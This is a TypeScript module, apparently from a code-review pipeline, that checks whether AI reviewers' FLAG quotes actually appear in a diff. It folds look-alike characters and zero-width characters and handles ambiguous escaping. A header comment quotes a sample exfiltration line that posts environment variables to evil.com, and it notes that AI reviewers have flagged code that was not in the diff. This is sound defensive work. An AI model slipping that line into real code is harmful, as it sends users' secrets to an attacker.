// Is a review FLAG quoting code that is actually in the diff? Ported from secure-update's
// review-ground.ts. ground() returns one word:
//   GROUNDED    ≥1 quoted snippet from a FLAG line appears in the chunk
//   UNGROUNDED  ≥1 snippet extracted, none of them appear in the chunk
//   NOQUOTE     no usable snippet (no quotes, or all < MIN_SNIPPET chars)
//
// Why: reviewers have FLAGged a HEAD range quoting code that is not in it
// (`requests.post('http://evil.com/log', json=env_vars)`), while another run APPROVEd the
// identical range. The prompt demands verbatim quotes; this checks them. It never APPROVEs
// anything by itself: an UNGROUNDED FLAG only earns the chunk one re-review.

export const MIN_SNIPPET = 8;

// Loosening a match is always the safe direction here: GROUNDED keeps the FLAG
// standing, UNGROUNDED buys the chunk a second model draw. So both sides are
// folded the same way (review I1, 2026-09-28):
//   • NFKC — fullwidth / compatibility forms (`ｅｖａｌ`) fold to ASCII;
//   • strip \p{Cf} — zero-width chars planted in the diff (U+200B) vanish;
//   • a small confusables map — Cyrillic/Greek look-alikes fold to Latin, so a
//     reviewer that transliterates `еxample.com` to `example.com` still matches.
const CONFUSABLES: Record<string, string> = {
  "а": "a", "в": "b", "с": "c", "ԁ": "d", "е": "e", "һ": "h", "і": "i", "ј": "j", "к": "k",
  "ӏ": "l", "м": "m", "н": "h", "о": "o", "р": "p", "ԛ": "q", "ѕ": "s", "т": "t", "у": "y",
  "х": "x", "ԝ": "w", "А": "A", "В": "B", "С": "C", "Е": "E", "Н": "H", "І": "I", "Ј": "J",
  "К": "K", "М": "M", "О": "O", "Р": "P", "Ѕ": "S", "Т": "T", "Х": "X", "Ү": "Y",
  "α": "a", "ο": "o", "ρ": "p", "τ": "t", "ν": "v", "ι": "i", "κ": "k", "υ": "u", "χ": "x",
  "Α": "A", "Β": "B", "Ε": "E", "Ζ": "Z", "Η": "H", "Ι": "I", "Κ": "K", "Μ": "M", "Ν": "N",
  "Ο": "O", "Ρ": "P", "Τ": "T", "Υ": "Y", "Χ": "X",
};
const CONFUSABLE_RE = new RegExp(`[${Object.keys(CONFUSABLES).join("")}]`, "g");

/** Folds look-alike Cyrillic and Greek letters to Latin. */
export function foldConfusables(text: string): string {
  return text.replace(CONFUSABLE_RE, c => CONFUSABLES[c] ?? c);
}

// Fold as above, strip ONE leading diff marker (+, -, space) per line, collapse
// whitespace, trim.
export function normalise(text: string): string {
  return text
    .normalize("NFKC")
    .replace(/\p{Cf}/gu, "")
    .replace(CONFUSABLE_RE, c => CONFUSABLES[c] ?? c)
    .split("\n")
    .map(l => l.replace(/^[+\- ]/, ""))
    .join("\n")
    .replace(/\s+/g, " ")
    .trim();
}

// Unescape variants of one quoted snippet. The reviewer's escaping is ambiguous:
// `\n` may be its JSON newline or a literal backslash-n in the code, and `\\x63`
// may be JSON for the code's `\x63`. Try each reading; any that matches counts.
function variants(raw: string): string[] {
  const unesc = (set: string) => raw.replace(/\\(["nt\\])/g, (m, c) =>
    !set.includes(c) ? m : c === "n" ? "\n" : c === "t" ? "\t" : c);
  return [...new Set([raw, unesc('nt"\\'), unesc('"\\')])];
}

// Every quoted snippet on a FLAG line → the list of its candidate pieces: each
// unescape variant split on elisions (... / …), keeping pieces ≥ MIN_SNIPPET
// once normalised. A snippet with no such piece is dropped.
export function snippets(review: string): string[][] {
  const out: string[][] = [];
  for (const line of review.split("\n")) {
    if (!line.includes("FLAG")) continue;
    for (const m of line.matchAll(/"((?:[^"\\]|\\.)*)"/g)) {
      const pieces = variants(m[1] ?? "")
        .flatMap(v => v.split(/\.\.\.|…/))
        .map(normalise)
        .filter(p => p.length >= MIN_SNIPPET);
      if (pieces.length) out.push(pieces);
    }
  }
  return out;
}

export function ground(review: string, chunk: string): "GROUNDED" | "UNGROUNDED" | "NOQUOTE" {
  const found = snippets(review);
  if (found.length === 0) return "NOQUOTE";
  const hay = normalise(chunk);
  return found.some(pieces => pieces.some(p => hay.includes(p))) ? "GROUNDED" : "UNGROUNDED";
}
